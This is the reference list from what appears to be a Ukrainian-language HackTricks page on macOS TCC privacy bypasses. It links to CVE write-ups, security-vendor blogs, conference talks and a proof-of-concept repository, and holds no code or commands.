- [3] [CVE-2022-22655 — обхід Location Services у TCC (первинне повідомлення)](https://theevilbit.github.io/posts/cve-2022-22655/)
- [4] [Де у світі Кармен Сандієго: зловживання Location Services у macOS](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [5] [Jamf Threat Labs — CVE-2024-44131: обхід TCC викрадає дані з iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [SQLite — `test_sqllog.c` (змінні середовища `SQLITE_ENABLE_SQLLOG`)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [7] [Apple — entitlement для дозволу змінних середовища DYLD](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [8] [The Eclectic Light Company — нотаризація: посилений runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
- [9] [У шкідливому ПЗ XCSSET виявлено zero-day обхід TCC](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [10] [OBTS v5.0: «Що відбувається на вашому Mac, залишається в iCloud від Apple?!» — Войцех Регула](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [11] [Нова вразливість macOS «powerdir» може призвести до несанкціонованого доступу до даних користувачів](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [12] [Зміна домашнього каталогу й обхід TCC, або CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [13] [Відтворення музики й обхід TCC, або CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [14] [Як пограбувати (Fire)fox](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [15] [CVE-2023-26818 — обхід TCC за допомогою Telegram у macOS](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [16] [Kandji — виявлення вразливостей Apple: аудит diskarbitrationd і storagekitd, частина 2](https://www.kandji.io/blog/macos-audit-story-part2)
- [17] [Патрік Вордл — Objective by the Sea v2.0: синтетичні кліки й перехоплення подій CoreGraphics](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)
- [18] [breakpointHQ/TCC-ClickJacking — підтвердження концепції](https://github.com/breakpointHQ/TCC-ClickJacking)
- [19] [Stack Overflow — налаштування змінних середовища в OS X](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)
- [20] [theevilbit — CVE-2020-9771: обхід TCC і підвищення привілеїв через mount_apfs](https://theevilbit.github.io/posts/cve_2020_9771/)
- [21] [theevilbit — CVE-2021-30808: обхід TCC шляхом монтування поверх бази даних TCC](https://theevilbit.github.io/posts/cve-2021-30808/)
- [22] [Понад 20 способів обійти механізми конфіденційності macOS](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [23] [Перемога над TCC — понад 20 НОВИХ способів обійти механізми конфіденційності macOS](https://www.youtube.com/watch?v=a9hsxPdRxsY)
- [24] [Від Spotlight до Apple Intelligence — зловживання 0day для викрадення даних, на яких працює ШІ macOS](https://objective-see.org/blog/blog_0x81.html)
{{#include ../../../../../banners/hacktricks-training.md}}
